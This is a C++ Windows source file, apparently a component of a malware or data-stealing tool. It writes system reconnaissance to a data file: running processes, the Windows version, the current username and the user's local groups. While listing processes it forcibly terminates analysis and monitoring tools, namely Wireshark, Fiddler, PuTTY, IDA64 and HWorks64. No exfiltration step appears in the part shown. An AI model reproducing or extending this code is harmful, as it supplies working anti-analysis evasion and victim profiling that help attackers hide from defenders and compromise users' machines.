#ifndef UNICODE
#define UNICODE
#endif

#pragma warning(disable : 4996)
#pragma comment(lib, "netapi32.lib")
#include "userData.h"
#include <string>
#include <windows.h>
#include <Lmcons.h>
#include <fstream>
#include <cstdio>
#include <iostream>
#include <lm.h>
#include <tlhelp32.h>
#include <stdio.h>
using std::ofstream;
using std::string;

void getAllProcesses(ofstream& dataFile)
{
	dataFile << "------------------------------------------\n";
	dataFile << "ALL PROCESSES CURRENT RUNNING: \n";
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{

		while (Process32Next(snapshot, &entry) == TRUE)
		{
			std::wstring ws(entry.szExeFile);
			// your new String
			string procName(ws.begin(), ws.end());

			dataFile << "ID: " << entry.th32ProcessID << "\t--" << procName << "\n";
			if (procName.compare("Wireshark.exe") == 0)
			{
				dataFile << "Wireshark.exe -- CLOSED\n";
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
				TerminateProcess(hProcess, 0);
				CloseHandle(hProcess);
			}
			if (procName.compare("Fiddler.exe") == 0)
			{
				dataFile << "Fiddler.exe -- CLOSED\n";
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
				TerminateProcess(hProcess, 0);
				CloseHandle(hProcess);
			}
			if (procName.compare("putty.exe") == 0)
			{
				dataFile << "putty.exe -- CLOSED\n";
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
				TerminateProcess(hProcess, 0);
				CloseHandle(hProcess);
			}
			if (procName.compare("ida64.exe") == 0)
			{
				dataFile << "ida64.exe -- CLOSED\n";
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
				TerminateProcess(hProcess, 0);
				CloseHandle(hProcess);
			}
			if (procName.compare("HWorks64.exe") == 0)
			{
				dataFile << "HWorks64.exe -- CLOSED\n";
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
				TerminateProcess(hProcess, 0);
				CloseHandle(hProcess);
			}
		}
	}
	dataFile << "------------------------------------------\n";
	CloseHandle(snapshot);
}

void getwindowsVersion(ofstream& dataFile)
{
	DWORD dwVersion = 0;
	DWORD dwMajorVersion = 0;
	DWORD dwMinorVersion = 0;
	DWORD dwBuild = 0;

	dwVersion = GetVersion();

	// Get the Windows version.
	dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
	dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));

	// Get the build number.
	if (dwVersion < 0x80000000)
	{
		dwBuild = (DWORD)(HIWORD(dwVersion));
	}

	dataFile << "Version is " << dwMajorVersion << "." << dwMinorVersion << " (" << dwBuild << ")\n";
}

string getCurrentUserName(ofstream& dataFile)
{
	wchar_t user[256];
	DWORD size = sizeof(user) / sizeof(user[0]);
	GetUserNameW(user, &size);
	std::wstring ws(user);
	string userName(ws.begin(), ws.end());
	dataFile << "Username: " << userName << "\n";
	return userName;
}

void getUserGroups(ofstream& dataFile)
{
	LPLOCALGROUP_USERS_INFO_0 pBuf = NULL;
	DWORD dwLevel = 0;
	DWORD dwFlags = LG_INCLUDE_INDIRECT;
	DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
	DWORD dwEntriesRead = 0;
	DWORD dwTotalEntries = 0;
	NET_API_STATUS nStatus;

	/* get current username */
	wchar_t user[256];
	DWORD size = sizeof(user) / sizeof(user[0]);
	GetUserNameW(user, &size);

	/* gets all the local groups of the current user */
	nStatus = NetUserGetLocalGroups(
		0,
		user,
		0,
		dwFlags,
		(LPBYTE*)&pBuf,
		dwPrefMaxLen,
		&dwEntriesRead,
		&dwTotalEntries
	);

	//
   // If the call succeeds,
   //
	if (nStatus == NERR_Success)
	{
		LPLOCALGROUP_USERS_INFO_0 pTmpBuf;
		DWORD i;
		DWORD dwTotalCount = 0;

		if ((pTmpBuf = pBuf) != NULL)
		{
			dataFile << "User local groups: \n";
			//
			// Loop through the entries and 
			//  print the names of the local groups 
			//  to which the user belongs. 
			//
			for (i = 0; i < dwEntriesRead; i++)
			{

				if (pTmpBuf == NULL)
				{
					fprintf(stderr, "An access violation has occurred\n");
					break;
				}


				/* casting from wchar_t* to string */
				std::wstring ws(pTmpBuf->lgrui0_name);
				string groupName(ws.begin(), ws.end());


				dataFile << "\t-- " << groupName << "\n";


				pTmpBuf++;
				dwTotalCount++;
			}
		}
	}

}